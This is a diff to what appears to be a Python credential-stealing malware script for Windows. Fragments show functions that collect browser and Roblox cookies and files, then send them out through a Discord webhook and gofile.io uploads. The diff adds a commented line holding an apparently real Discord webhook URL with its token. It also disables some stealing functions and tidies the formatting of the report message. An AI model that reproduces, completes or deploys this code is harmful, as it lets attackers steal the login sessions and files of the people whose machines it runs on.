@@ -26,8 +26,8 @@ else:
     # If not running on Windows, exit the program
     quit()
 
-
-hook = "WEBHOOK_HERE"
+#https://canary.discord.com/api/webhooks/1078237508833390683/4lQklEhIbk-T8H7Bfw6mPWipA3onoRfHu-o9BW7yHQvxyLtKjm4gHq-qq8DTrfDO19aU
+hook = "WEBHOOK HERE"
 
 try:
     import requests
@@ -711,6 +711,7 @@ def GetCookies(path, arg):
 
 
 def RobloxCookie(path, arg):
+    return
     global roblox_cookie
     pathC = path + arg + "\Cookies"
     tempfold = (
@@ -1147,6 +1148,7 @@ def GatherAll():
 
 
 def uploadToAnonfiles(path):
+    return
     try:
         return requests.post(
             f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
@@ -1307,7 +1309,7 @@ GamingZip = []
 OtherZip = []
 
 GatherAll()
-RobloxCookie()
+#RobloxCookie()
 Injection()
 DETECTED = Trust(Cookies)
 # DETECTED = False
@@ -1324,11 +1326,11 @@ if not DETECTED:
         if len(arg[2]) != 0:
             foldpath = arg[1]
             foldlist = arg[2]
-            filetext += f"📁 {foldpath}\n"
+            filetext += f":file_folder: {foldpath}\n"
 
             for ffil in foldlist:
                 a = ffil[0].split("/")
-                fileanme = a[len(a), 1]
+                fileanme = a[1]
                 b = ffil[1]
                 filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
             filetext += "\n"
